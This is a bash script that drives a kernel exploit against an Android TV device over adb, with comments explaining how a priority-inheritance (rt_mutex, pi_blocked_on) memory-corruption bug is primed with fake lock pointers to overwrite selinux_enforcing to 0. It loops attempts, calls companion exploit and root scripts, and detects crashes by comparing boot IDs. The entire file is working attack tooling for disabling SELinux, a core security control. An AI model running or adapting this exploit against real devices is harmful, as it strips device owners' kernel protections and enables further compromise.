#!/bin/bash
# off_selinux.sh - hit the real target 0xffffff8009385590 and write
#                  selinux_enforcing (the neighbouring int) to 0.
#
# Recipe is the --soft variant:  --soft --ucoff 0x108 121 19
#   nice=19          => task->prio = min(139,120) = 120, pinned by PI inheritance
#                       from the owner
#   staged prio 121  => only a real hit makes waiter->prio = 121 != 120 and opens
#                       the gate
#   no hit           => the leftover waiter still has prio 120 == 120, the gate
#                       stays closed and rt_mutex_adjust_pi returns immediately
#                       (zero risk)
#   --soft           => the whole VFP copy window is pre-filled with a fake lock
#                       pointer, then only pc/rb_right/rb_left are overwritten.
#                       So even if pi_blocked_on does not land exactly on 0x108,
#                       the leftover's lock slot holds a fake lock instead of a
#                       freed pi_state, and the chain spins inside our own page:
#                       a crash degrades into silence.
#
# Verdict (external, independent of the exploit process):
#   adb shell cat /sys/fs/selinux/enforce  ->  0
# Classification: boot_id changed = crashed once; unchanged and no hit = that
# process had pi_blocked_on == NULL, retry with a different process.
#
# Usage:  DEV=<tv-ip>:5555 bash ghost/off_selinux.sh [max-attempts]
#
# Env:
#   DEV  adb serial / host:port of the target (required)
#   ADB  path to the adb binary (default: adb on PATH)
set -u
: "${DEV:?set DEV=<tv-ip>:5555}"
ADB="${ADB:-adb}"
HERE="$(cd "$(dirname "$0")" && pwd -W 2>/dev/null || cd "$(dirname "$0")" && pwd)"
MAX="${1:-20}"
OUT="$HERE/../logs/off_selinux.log"
mkdir -p "$HERE/../logs"
: > "$OUT"
log() { echo "$@" | tee -a "$OUT"; }

enforce() {
  "$ADB" -s "$DEV" shell 'cat /sys/fs/selinux/enforce 2>/dev/null' 2>/dev/null | tr -d '\r\n'
}
bootid() {
  "$ADB" -s "$DEV" shell 'cat /proc/sys/kernel/random/boot_id 2>/dev/null' 2>/dev/null | tr -d '\r\n'
}
waitdev() {
  for i in $(seq 1 40); do
    "$ADB" connect "$DEV" >/dev/null 2>&1
    [ "$("$ADB" -s "$DEV" get-state 2>/dev/null | tr -d '\r')" = "device" ] && return 0
    sleep 10
  done
  return 1
}

log "########## off_selinux v2(--soft) start $(date '+%H:%M:%S')  max $MAX attempts"

for N in $(seq 1 "$MAX"); do
  waitdev || { log "!! device did not come back in 400s, aborting"; exit 1; }

  E0=$(enforce)
  if [ "$E0" = "0" ]; then
    log "*** already permissive (enforce=0), nothing to do"
    exit 0
  fi

  B0=$(bootid)
  bash "$HERE/ensure_root.sh" >/dev/null 2>&1
  log ""
  log "=== attempt [$N/$MAX]  boot=${B0:0:8}  enforce before=$E0  $(date '+%H:%M:%S')"

  O=$(bash "$HERE/run24b.sh" --soft --ucoff 0x108 121 19 --rounds 4000 2>&1)

  E1=$(enforce)
  if echo "$O" | grep -q 'SELINUX OFF' || [ "$E1" = "0" ]; then
    log "***** success: selinux_enforcing is now 0, enforce=$E1"
    echo "$O" | grep -E 'staged|trigger|SELINUX OFF|elapsed' | tee -a "$OUT"
    log "########## off_selinux succeeded $(date '+%H:%M:%S')"
    exit 0
  fi

  B1=$(bootid)
  if [ -n "$B1" ] && [ "$B1" != "$B0" ]; then
    log "--- [$N] X crash (boot changed to ${B1:0:8}; network debugging must be re-enabled by hand)"
  else
    log "--- [$N] survived, no hit (pi_blocked_on was NULL; retry with another process)"
  fi
done

log ""
log "########## failed after $MAX attempts $(date '+%H:%M:%S')"
exit 2
